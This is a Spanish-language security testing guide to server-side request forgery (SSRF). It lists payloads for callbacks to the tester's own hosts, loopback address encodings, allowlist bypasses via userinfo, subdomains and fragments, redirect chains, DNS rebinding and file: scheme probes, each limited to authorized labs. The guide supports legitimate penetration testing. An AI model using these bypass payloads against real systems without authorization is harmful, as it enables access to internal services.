# 🗡️ Server-Side Request Forgery (SSRF): payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Canary HTTP y DNS propios

```text
https://{RECEPTOR_PROPIO}/ssrf/{NONCE}
http://{NONCE}.{DOMINIO_DNS_PROPIO}/
https://{RECEPTOR_PROPIO}:8443/ssrf/{NONCE}
```

**Cuándo usarlo:** Una consulta DNS es una señal de resolución; observar HTTP en el receptor para confirmar la conexión.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/ssrf/blind).


### Formas de loopback en un laboratorio

```text
http://127.0.0.1:{PUERTO_LAB}/canary
http://127.1:{PUERTO_LAB}/canary
http://2130706433:{PUERTO_LAB}/canary
http://0x7f000001:{PUERTO_LAB}/canary
http://[::1]:{PUERTO_LAB}/canary
```

**Cuándo usarlo:** Solo con un listener propio. La biblioteca puede aceptar, normalizar o rechazar cada forma.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md).


## 🧭 Payloads por contexto

### Parámetros de URL habituales

```text
?url=https://{RECEPTOR_PROPIO}/ssrf/{NONCE}
?callback=https://{RECEPTOR_PROPIO}/ssrf/{NONCE}
?webhook=https://{RECEPTOR_PROPIO}/ssrf/{NONCE}
?image=https://{RECEPTOR_PROPIO}/imagen/{NONCE}
{"url":"https://{RECEPTOR_PROPIO}/ssrf/{NONCE}"}
```

**Cuándo usarlo:** Elegir un parámetro que exista en el flujo real; las rutas de ejemplo no prueban que el backend haga fetch.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/ssrf).


## 🔥 Payloads avanzados

### Confusión de autoridad y redirección

```text
https://{HOST_PERMITIDO}@{RECEPTOR_PROPIO}/ssrf/{NONCE}
https://{HOST_PERMITIDO}.{RECEPTOR_PROPIO}/ssrf/{NONCE}
https://{RECEPTOR_PROPIO}/ssrf/{NONCE}#{HOST_PERMITIDO}
https://{RECEPTOR_PROPIO}/redirigir?destino=https%3A%2F%2F{SEGUNDO_RECEPTOR_PROPIO}%2Fssrf%2F{NONCE}
```

**Cuándo usarlo:** Cada línea es una alternativa. Para la última, configurar en el receptor propio una respuesta 302 hacia el segundo receptor propio; comparar la URL aceptada y cada host contactado.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md).


### Dirección privada tras re-resolución DNS

```text
{DOMINIO_REBIND_PROPIO} A inicial  = {IP_PUBLICA_PROPIA}
{DOMINIO_REBIND_PROPIO} A posterior = {IP_PRIVADA_LAB_PROPIA}
URL enviada = http://{DOMINIO_REBIND_PROPIO}:{PUERTO_LAB}/canary
```

**Cuándo usarlo:** Solo laboratorio propio. Registrar segunda resolución y conexión; el cambio de DNS por sí solo no demuestra bypass.

**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).


## 🔬 Pruebas guiadas por escenario

### 1. Callback HTTP controlado

**Objetivo:** Determinar si la solicitud nace del servidor, con URL única.

```json
{"url":"https://{CONTROLLED_HOST}/ssrf-{NONCE}"}
```

**Interpretación:** Registrar hora, IP y ruta; un prefetch del navegador o un escáner de enlaces no confirma SSRF del backend.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/ssrf).

### 2. Callback DNS controlado

**Objetivo:** Detectar una primitive ciega cuando no retorna cuerpo HTTP.

```json
{"url":"http://{NONCE}.{CONTROLLED_HOST}/"}
```

**Interpretación:** Una consulta DNS correlacionada indica resolución; no demuestra que el servidor completó una conexión HTTP.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/ssrf/blind).

### 3. Redirección entre dos hosts propios

**Objetivo:** Comprobar validación del destino final en un endpoint de redirección controlado.

```text
https://{HOST_PROPIO_A}/redirigir?to=https%3A%2F%2F{HOST_PROPIO_B}%2Fssrf-{NONCE}
```

**Interpretación:** Ambos hosts deben ser propios. Si el segundo recibe la llamada, el cliente sigue redirecciones; falta probar un destino prohibido en laboratorio.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).

### 4. Confusión por userinfo

**Objetivo:** Comparar host validado y host realmente contactado en laboratorio.

```text
https://{HOST_PERMITIDO}@{CONTROLLED_HOST}/ssrf-{NONCE}
```

**Interpretación:** En una URL estándar el host de conexión va después de `@`. Solo es bypass si el validador se fija en el prefijo y el cliente contacta el host propio.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).

### 5. Subdominio aparente

**Objetivo:** Comprobar allowlist por prefijo/sufijo mal anclada.

```text
https://{HOST_PERMITIDO}.{CONTROLLED_HOST}/ssrf-{NONCE}
```

**Interpretación:** El dominio registrable es el controlado; registrar la aceptación por la aplicación y la callback.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).

### 6. Fragmento y query

**Objetivo:** Detectar comprobaciones de cadenas que interpretan host dentro de query o fragmento.

```text
https://{CONTROLLED_HOST}/ssrf-{NONCE}#{HOST_PERMITIDO}
https://{CONTROLLED_HOST}/ssrf-{NONCE}?next={HOST_PERMITIDO}
```

**Interpretación:** Un parser correcto sigue conectando a `{CONTROLLED_HOST}`; solo hay fallo si la validación permite la URL por el texto añadido.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).

### 7. IPv6 loopback en laboratorio

**Objetivo:** Distinguir filtros que solo reconocen la forma IPv4 de localhost.

```text
http://[::1]:{PUERTO_DEL_LAB}/marcador
```

**Interpretación:** Usar un servicio local propio del laboratorio. Un error de conexión no demuestra filtrado ni acceso interno.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).

### 8. IPv4 decimal en laboratorio

**Objetivo:** Comprobar normalización de direcciones antes de aplicar la política.

```text
http://2130706433:{PUERTO_DEL_LAB}/marcador
```

**Interpretación:** `2130706433` puede interpretarse como 127.0.0.1 según la biblioteca. Probar únicamente contra un listener propio.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).

### 9. Esquema no HTTP

**Objetivo:** Verificar allowlist explícita de esquemas sin leer archivos.

```text
file:///ruta/inexistente/marcador-{NONCE}
```

**Interpretación:** Un error de lectura puede revelar que se aceptó `file:`; no solicitar archivos reales. Documentar parser y respuesta.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/ssrf).

### 10. DNS rebinding aislado

**Objetivo:** Separar validación DNS y conexión final con un nombre y dos direcciones alcanzables del laboratorio.

```text
http://{HOST_DNS_PROPIO}/ssrf-{NONCE}
Primera resolución A={IP_CONTROLADA_A}; segunda resolución A={IP_CONTROLADA_B}
```

**Interpretación:** Configurar respuestas DNS y TTL en laboratorio; registrar la IP de conexión. Direcciones de documentación no routables no sirven para confirmar el flujo.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).

### 11. Loopback hexadecimal en laboratorio

**Objetivo:** Comprobar si la biblioteca interpreta una IP hexadecimal como loopback.

```text
http://0x7f000001:{PUERTO_DEL_LAB}/marcador
```

**Interpretación:** Solo con listener propio. Se debe observar conexión a 127.0.0.1; aceptación textual no demuestra SSRF.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).

### 12. IPv4 abreviada en laboratorio

**Objetivo:** Probar normalización de 127.1 hacia 127.0.0.1.

```text
http://127.1:{PUERTO_DEL_LAB}/marcador
```

**Interpretación:** El comportamiento varía por cliente HTTP. Documentar IP efectiva en el servidor de laboratorio.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).

### 13. IPv6 mapeada a IPv4

**Objetivo:** Verificar que la política filtra direcciones IPv4 codificadas como IPv6.

```text
http://[::ffff:127.0.0.1]:{PUERTO_DEL_LAB}/marcador
```

**Interpretación:** Solo laboratorio propio. Algunas librerías normalizan la dirección y otras la rechazan.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).

### 14. Puerto no estándar en host propio

**Objetivo:** Comprobar si la política de salida cubre también el puerto.

```text
https://{CONTROLLED_HOST}:{PUERTO_PROPIO_ALTERNO}/ssrf-{NONCE}
```

**Interpretación:** La callback prueba salida a ese puerto; un puerto abierto no implica acceso a red interna.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/ssrf).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
